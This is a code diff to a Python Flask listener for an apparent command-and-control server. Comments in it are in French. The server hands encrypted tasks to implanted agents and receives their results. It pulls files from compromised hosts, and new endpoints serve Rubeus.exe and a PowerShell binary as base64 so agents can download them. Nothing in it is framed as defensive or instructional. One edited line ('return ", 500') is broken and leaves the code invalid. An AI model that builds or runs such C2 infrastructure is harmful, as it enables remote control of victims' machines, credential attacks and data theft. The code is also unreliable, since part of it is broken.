@@ -22,8 +22,8 @@ class Listener():
         self.id   = name
         self.Path = "data/listeners/{}/".format(self.id)
         self.agentsPath = "{}agents/".format(self.Path)
-        self.agentsPath_download_files = "/home/so/Bureau/C2_download/"
-        self.agentsPath_upload_files = "/home/so/Bureau/C2_uploads/"
+        self.agentsPath_download_files = "/opt/C2_download/"
+        self.agentsPath_upload_files = "/opt/C2_uploads/"
         
         
         self.app = flask.Flask(__name__)
@@ -86,11 +86,12 @@ class Listener():
                     task = f.read()
                 encrypted_task = encode_this(task,name)
                 clearAgentTasks(name)
-                print(task)
+                #print(encrypted_task)
                 return(encrypted_task.strip(),200)
             else:
-                
-                return("",204)
+                encrypted_task = encode_this("no tasks",name)
+                #print(encrypted_task)
+                return(encrypted_task.strip(),204)
 
         @self.app.route("/secret/<name>", methods=['GET'])
         def serveSecret(name): 
@@ -123,7 +124,7 @@ class Listener():
             original_path = flask.request.form.get("path")
 
             if not encoded_file or not original_path or not name:
-                return "", 500
+                return ", 500
 
             name_file = os.path.basename(original_path)
 
@@ -175,21 +176,21 @@ class Listener():
 
                         except Exception as e_bin:
                             print(f"Erreur lecture fichier binaire {full_file_path}: {e_bin}")
-                            
-                            return "", 204
+                            encrypted_data = encode_this("no uploads", name)
+                            return encrypted_data, 200
 
                     payload = path + "mon|file" + file_encoded
                     encrypted_data = encode_this(payload, name)
-                    return encrypted_data, 200
+                    return encrypted_data.strip(), 200
 
                 else:
                     print(f"File {path} doesn't exist...")
-                    
-                    return "", 204
+                    encrypted_data = encode_this("no uploads", name)
+                    return encrypted_data, 200
 
             else:
-                
-                return "", 204
+                encrypted_data = encode_this("no uploads", name)
+                return encrypted_data, 200
                 
 
         @self.app.route("/results/<name>", methods=['POST'])
@@ -203,39 +204,48 @@ class Listener():
                 original_text = original_bytes.decode("utf-8")  # ← ici, tu récupères les vrais sauts de ligne
             except UnicodeDecodeError:
                 original_text = original_bytes.decode("utf-8", errors="replace")
+
             displayResults(name,original_text)
             return("",200)
 
-        @self.app.route("/rb", methods=['GET'])
-        def serveRB():
-            file_path = "/home/kali/Documents/rb"
-    
-            try:
-                with open(file_path, "r") as file:
-                    content = file.read()
-                return (content, 200)  
-            except :
-                return("error",200) 
         @self.app.route("/exe", methods=['GET'])
         def serveEXE():
-            file_path = "/home/kali/Documents/exe"
+            file_path = "/home/so/Documents/exe"
     
-            try:
-                with open(file_path, "r") as file:
-                    content = file.read()
-                return (content, 200)  
-            except : 
-                return("error",200) 
-        @self.app.route("/powershell", methods=['GET'])
-        def serve_powershell():
-            file_path = "/home/kali/Documents/powershell"
-        
             try:
                 with open(file_path, "r") as file:
                     content = file.read()
                 return (content, 200)  
             except :
                 return("error",200) 
+        @self.app.route("/rb", methods=['GET'])
+        def serveRB():
+            file_path = "/opt/Rubeus.exe"
+    
+            try:
+                with open(file_path, "rb") as f:
+                    raw = f.read()
+                b64_str = base64.b64encode(raw).decode('ascii')
+                # On renvoie du texte brut pour que curl ou un navigateur
+                # puisse récupérer directement la chaîne Base64.
+                return Response(b64_str, status=200, mimetype='text/plain')
+            except Exception as e:
+                # En cas d’erreur (fichier manquant, permissions, etc.)
+                return Response(f"error: {e}", status=500, mimetype='text/plain') 
+        @self.app.route("/powershell", methods=['GET'])
+        def serve_powershell():
+            file_path = "/opt/powershell.exe"
+        
+            try:
+                with open(file_path, "rb") as f:
+                    raw = f.read()
+                b64_str = base64.b64encode(raw).decode('ascii')
+                # On renvoie du texte brut pour que curl ou un navigateur
+                # puisse récupérer directement la chaîne Base64.
+                return Response(b64_str, status=200, mimetype='text/plain')
+            except Exception as e:
+                # En cas d’erreur (fichier manquant, permissions, etc.)
+                return Response(f"error: {e}", status=500, mimetype='text/plain')
     def run(self):
         '''log = logging.getLogger('werkzeug')
         log.setLevel(logging.ERROR)
